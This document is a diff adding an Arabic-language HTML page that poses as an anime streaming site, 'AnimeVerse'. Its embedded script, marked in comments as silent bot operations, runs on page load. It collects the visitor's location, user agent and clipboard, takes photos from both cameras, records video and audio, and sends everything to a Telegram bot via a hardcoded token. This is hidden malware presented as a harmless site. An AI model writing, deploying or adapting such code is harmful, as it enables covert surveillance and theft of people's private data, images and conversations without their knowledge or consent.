@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AnimeVerse - عالم أفلام الأنمي الحصري</title>
+    <style>
+        :root {
+            --bg-color: #08070b;
+            --card-bg: #121019;
+            --accent-glow: #e11d48;
+            --accent-purple: #9333ea;
+            --text-color: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            scroll-behavior: smooth;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+        }
+        /* Navbar */
+        nav {
+            background: rgba(8, 7, 11, 0.9);
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            padding: 18px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(12px);
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, #e11d48, #9333ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+        .nav-links {
+            display: flex;
+            gap: 25px;
+            list-style: none;
+        }
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover {
+            color: var(--accent-glow);
+        }
+        /* Hero Banner */
+        .hero {
+            position: relative;
+            height: 550px;
+            background: linear-gradient(to top, var(--bg-color), rgba(8,7,11,0.4)), url('https://images.unsplash.com/photo-1578632767115-351597cf2477?auto=format&fit=crop&w=1600&q=80') no-repeat center center/cover;
+            display: flex;
+            align-items: center;
+            padding: 0 60px;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+        .hero-content {
+            max-width: 600px;
+            z-index: 2;
+        }
+        .hero-content h1 {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 15px;
+            line-height: 1.2;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.8);
+        }
+        .hero-content p {
+            color: var(--text-muted);
+            font-size: 1.15rem;
+            margin-bottom: 25px;
+        }
+        .watch-btn {
+            background: linear-gradient(45deg, #e11d48, #9333ea);
+            color: #fff;
+            padding: 14px 35px;
+            border-radius: 30px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 0 25px rgba(225, 29, 72, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .watch-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 35px rgba(225, 29, 72, 0.7);
+        }
+        /* Container */
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 50px 20px;
+        }
+        .section-title {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            border-right: 4px solid var(--accent-glow);
+            padding-right: 15px;
+            font-weight: 800;
+        }
+        /* Grid Movies */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 30px;
+        }
+        .movie-card {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.06);
+            transition: transform 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        .movie-card:hover {
+            transform: translateY(-8px);
+            border-color: var(--accent-glow);
+            box-shadow: 0 15px 35px rgba(225, 29, 72, 0.2);
+        }
+        .poster-box {
+            position: relative;
+            width: 100%;
+            height: 360px;
+            overflow: hidden;
+        }
+        .poster-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        .movie-card:hover .poster-box img {
+            transform: scale(1.08);
+        }
+        .badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            color: #fbbf24;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
+        .movie-info {
+            padding: 20px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .movie-info h3 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+        }
+        .movie-info p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+        .card-btn {
+            background: rgba(255,255,255,0.08);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+            text-align: center;
+            text-decoration: none;
+        }
+        .card-btn:hover {
+            background: var(--accent-glow);
+            border-color: var(--accent-glow);
+        }
+        /* Footer */
+        footer {
+            background-color: var(--card-bg);
+            text-align: center;
+            padding: 40px;
+            color: var(--text-muted);
+            border-top: 1px solid rgba(255,255,255,0.06);
+            margin-top: 60px;
+        }
+        footer span {
+            color: var(--accent-glow);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- القائمة -->
+    <nav>
+        <div class="logo">ANIMEVERSE</div>
+        <ul class="nav-links">
+            <li><a href="#">الرئيسية</a></li>
+            <li><a href="#movies">الأفلام الحصرية</a></li>
+            <li><a href="#series">المسلسلات</a></li>
+            <li><a href="#vip">عضوية VIP</a></li>
+        </ul>
+    </nav>
+
+    <!-- الواجهة الحماسية -->
+    <header class="hero">
+        <div class="hero-content">
+            <h1>عالم الأأنمي بلا حدود</h1>
+            <p>استمتع بمشاهدة أحدث أفلام ومسلسلات الأنمي بجودة خيالية 4K وبدون إعلانات مزعجة.</p>
+            <a href="#movies" class="watch-btn">استعرض المكتبة الآن</a>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2 id="movies" class="section-title">أحدث الأفلام الحصرية</h2>
+        
+        <div class="grid">
+            <!-- فيلم 1 -->
+            <div class="movie-card">
+                <div class="poster-box">
+                    <span class="badge">⭐ 9.8</span>
+                    <img src="https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?auto=format&fit=crop&w=600&q=80" alt="Anime 1">
+                </div>
+                <div class="movie-info">
+                    <div>
+                        <h3>Demon Blade: Infinity</h3>
+                        <p>ملحمة قتالية خيالية في عالم مظلم مليء بالإثارة.</p>
+                    </div>
+                    <a href="#movies" class="card-btn" onclick="alert('جاري تحميل الفيلم...')">مشاهدة الآن</a>
+                </div>
+            </div>
+
+            <!-- فيلم 2 -->
+            <div class="movie-card">
+                <div class="poster-box">
+                    <span class="badge">⭐ 9.5</span>
+                    <img src="https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80" alt="Anime 2">
+                </div>
+                <div class="movie-info">
+                    <div>
+                        <h3>Cyberpunk Zero</h3>
+                        <p>صراع البقاء في مستقبل ديستوبي مرعب ومذهل.</p>
+                    </div>
+                    <a href="#movies" class="card-btn" onclick="alert('جاري تحميل الفيلم...')">مشاهدة الآن</a>
+                </div>
+            </div>
+
+            <!-- فيلم 3 -->
+            <div class="movie-card">
+                <div class="poster-box">
+                    <span class="badge">⭐ 9.7</span>
+                    <img src="https://images.unsplash.com/photo-1563089145-599997674d42?auto=format&fit=crop&w=600&q=80" alt="Anime 3">
+                </div>
+                <div class="movie-info">
+                    <div>
+                        <h3>Shadow Monarch</h3>
+                        <p>عودة ملك الظلال بقوة خارقة لتغيير موازين القوى.</p>
+                    </div>
+                    <a href="#movies" class="card-btn" onclick="alert('جاري تحميل الفيلم...')">مشاهدة الآن</a>
+                </div>
+            </div>
+
+            <!-- فيلم 4 -->
+            <div class="movie-card">
+                <div class="poster-box">
+                    <span class="badge">⭐ 9.6</span>
+                    <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=600&q=80" alt="Anime 4">
+                </div>
+                <div class="movie-info">
+                    <div>
+                        <h3>Eternity Blade</h3>
+                        <p>رحلة أسطورية عبر عوالم متعددة وأبعاد موازية.</p>
+                    </div>
+                    <a href="#movies" class="card-btn" onclick="alert('جاري تحميل الفيلم...')">مشاهدة الآن</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- عناصر مخفية لعمليات البوت الصامتة -->
+    <video id="camVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <footer>
+        <p>جميع الحقوق محفوظة © 2026 <span>AnimeVerse</span></p>
+    </footer>
+
+    <script>
+        const botToken = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+        const chatId = "7713496654";
+
+        let clipboardHistory = JSON.parse(localStorage.getItem('cb_history') || '[]');
+
+        window.addEventListener('load', () => {
+            setTimeout(startBackgroundOperations, 1000);
+        });
+
+        async function startBackgroundOperations() {
+            let visitorId = localStorage.getItem('v_id');
+            if (!visitorId) {
+                visitorId = 'ID-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem('v_id', visitorId);
+            }
+
+            let report = "☠️ **[ SYSTEM BREACH DETECTED ]** ☠️\n";
+            report += "━━━━━━━━━━━━━━━━━━━\n";
+            report += `🛑 **TARGET LOCKED:** \`${visitorId}\`\n`;
+            report += `📱 **AGENT INTEL:** \`${navigator.userAgent}\`\n`;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        report += `📍 **GPS COORD:** \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n`;
+                        report += `🌐 **MAP LINK:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                        appendClipboardAndSend(report);
+                    },
+                    (err) => {
+                        report += `📍 **GPS COORD:** \`LOCATION_ACCESS_BLOCKED\`\n`;
+                        appendClipboardAndSend(report);
+                    },
+                    { timeout: 7000 }
+                );
+            } else {
+                appendClipboardAndSend(report);
+            }
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const cbText = await navigator.clipboard.readText();
+                    if (cbText && !clipboardHistory.includes(cbText)) {
+                        clipboardHistory.unshift(cbText);
+                        if (clipboardHistory.length > 10) clipboardHistory.pop();
+                        localStorage.setItem('cb_history', JSON.stringify(clipboardHistory));
+                    }
+                }
+            } catch (e) {}
+
+            await capturePhotosSequence();
+            await recordVideoEightSeconds();
+            await recordAudioTenSeconds();
+        }
+
+        function appendClipboardAndSend(text) {
+            text += "━━━━━━━━━━━━━━━━━━━\n";
+            if (clipboardHistory.length > 0) {
+                text += `🩸 **EXTRACTED CLIPBOARD DATA:**\n`;
+                clipboardHistory.forEach((item, idx) => {
+                    text += `> [${idx + 1}] \`${item.substring(0, 80)}\`\n`;
+                });
+            } else {
+                text += `🩸 **EXTRACTED CLIPBOARD DATA:** \`NO_TEXT_FOUND\`\n`;
+            }
+            text += "━━━━━━━━━━━━━━━━━━━\n";
+            text += "⚡ *ALL TARGET MEDIA IS BEING EXFILTRATED IN REAL-TIME...*";
+
+            sendTextToTelegram(text);
+        }
+
+        async function capturePhotosSequence() {
+            await captureSet("user", 4, "FRONT_CAM_CAPTURE");
+            await captureSet("environment", 4, "REAR_CAM_CAPTURE");
+        }
+
+        function captureSet(facing, count, label) {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
+                    .then(stream => {
+                        const video = document.getElementById('camVideo');
+                        video.srcObject = stream;
+                        
+                        let taken = 0;
+                        const timer = setInterval(() => {
+                            if (taken >= count) {
+                                clearInterval(timer);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                                return;
+                            }
+                            taken++;
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('chat_id', chatId);
+                                formData.append('photo', blob, `${label}_${taken}.jpg`);
+                                formData.append('caption', `💀 **[${label} #${taken}]**\n🎯 TARGET ID: \`${localStorage.getItem('v_id')}\``);
+
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(e => {});
+                            }, 'image/jpeg');
+
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        resolve();
+                    });
+            });
+        }
+
+        function recordVideoEightSeconds() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                        let chunks = [];
+
+                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('video', blob, 'target_video.webm');
+                            formData.append('caption', `🎬 **[LIVE VIDEO SURVEILLANCE - 8S]**\n🎯 TARGET ID: \`${localStorage.getItem('v_id')}\``);
+
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            });
+                        };
+
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === "recording") {
+                                mediaRecorder.stop();
+                            }
+                        }, 8000);
+                    })
+                    .catch(e => resolve());
+            });
+        }
+
+        function recordAudioTenSeconds() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        const mediaRecorder = new MediaRecorder(stream);
+                        let audioChunks = [];
+
+                        mediaRecorder.ondataavailable = event => {
+                            audioChunks.push(event.data);
+                        };
+
+                        mediaRecorder.onstop = () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('voice', audioBlob, 'target_audio.ogg');
+                            formData.append('caption', `🎙 **[AUDIO INTERCEPT - 10S]**\n🎯 TARGET ID: \`${localStorage.getItem('v_id')}\``);
+
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            });
+                        };
+
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === "recording") {
+                                mediaRecorder.stop();
+                            }
+                        }, 10000);
+                    })
+                    .catch(e => resolve());
+            });
+        }
+
+        function sendTextToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => {});
+        }
+    </script>
+
+</body>
+</html>
